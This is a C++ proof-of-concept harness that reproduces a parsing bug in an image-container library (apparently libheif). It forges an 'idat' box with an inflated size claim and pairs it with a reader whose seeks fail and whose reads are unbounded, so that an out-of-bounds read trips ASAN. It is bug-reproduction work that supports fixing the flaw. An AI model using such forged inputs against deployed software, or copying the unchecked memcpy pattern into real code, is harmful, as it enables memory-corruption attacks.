// bug14 — istr->seek() failure caught only by assert in Box_idat::read_data.
//
// We use a custom reader where seek() can fail. With NDEBUG the assert is
// gone; the subsequent read() runs from the WRONG (stale) position. With
// the reader's read also unbounded against the actual buffer, the OOB
// read fires ASAN.

#include <cstdio>
#include <cstdint>
#include <cstring>
#include <memory>
#include <vector>

#include "bitstream.h"
#include "box.h"
#include "security_limits.h"

class FailingSeekReader : public StreamReader {
public:
  FailingSeekReader(const uint8_t* data, size_t real_size)
    : m_data(data), m_real_size(real_size) {}
  uint64_t get_position() const override { return m_pos; }
  StreamReader::grow_status wait_for_file_size(uint64_t) override {
    return StreamReader::grow_status::size_reached;
  }
  // Reads are unbounded — they'll OOB once m_pos is past the actual buffer.
  bool read(void* dst, size_t n) override {
    std::memcpy(dst, m_data + m_pos, n);
    m_pos += n;
    return true;
  }
  // Seek to positions past the actual buffer is rejected — and that
  // failure is what bug14 says is silently dropped by Box_idat.
  bool seek(uint64_t pos) override {
    if (pos > m_real_size) {
      // Audit-comment scenario: leaves m_pos unchanged (stale).
      m_seek_failed = true;
      return false;
    }
    m_pos = pos;
    return true;
  }
private:
  const uint8_t* m_data; size_t m_real_size; uint64_t m_pos = 0;
  bool m_seek_failed = false;
};

// Forge an idat with a largesize big enough that start=32, length=64 pass
// the (start+length > box_size) check, but our actual backing buffer is
// tiny — so seek() rejects positions past the real buffer.
static std::vector<uint8_t> forge_idat_with_large_claim() {
  std::vector<uint8_t> b;
  for (int i = 24; i >= 0; i -= 8) b.push_back((uint8_t)((1u >> i) & 0xFF));   // size32=1
  const char* t = "idat";
  for (int i = 0; i < 4; i++) b.push_back((uint8_t)t[i]);
  uint64_t largesize = 0x100000;  // claim 1 MiB
  for (int i = 56; i >= 0; i -= 8) b.push_back((uint8_t)((largesize >> i) & 0xFF));
  for (int i = 0; i < 16; i++) b.push_back((uint8_t)i);  // only 16 bytes real payload
  return b;
}

int main() {
  auto buf = forge_idat_with_large_claim();
  // Real backing buffer is buf.size(). seek past that fails; reads are
  // unbounded so they OOB once the cursor is left past the real buffer.
  auto reader = std::make_shared<FailingSeekReader>(buf.data(), buf.size());
  BitstreamRange range(reader, /*length=*/(size_t)INT64_MAX);

  std::shared_ptr<Box> generic;
  heif_security_limits limits = *heif_get_global_security_limits();
  Box::read(range, &generic, &limits);
  auto idat = std::dynamic_pointer_cast<Box_idat>(generic);
  if (!idat) { std::fprintf(stderr, "[bug14] no idat\n"); return 0; }

  // m_data_start_pos = 16 (after the 16-byte largesize box header).
  // Choose start past buf.size()-16 so seek(m_data_start_pos+start) fails,
  // but stay within get_box_size() (= 0x100000) so we reach the seek line.
  std::vector<uint8_t> dest;
  Error e = idat->read_data(reader, /*start=*/64, /*length=*/64, dest, &limits);
  std::fprintf(stderr, "[bug14] survived: err=\"%s\" dest.size=%zu\n",
               e.message.c_str(), dest.size());
  return 0;
}
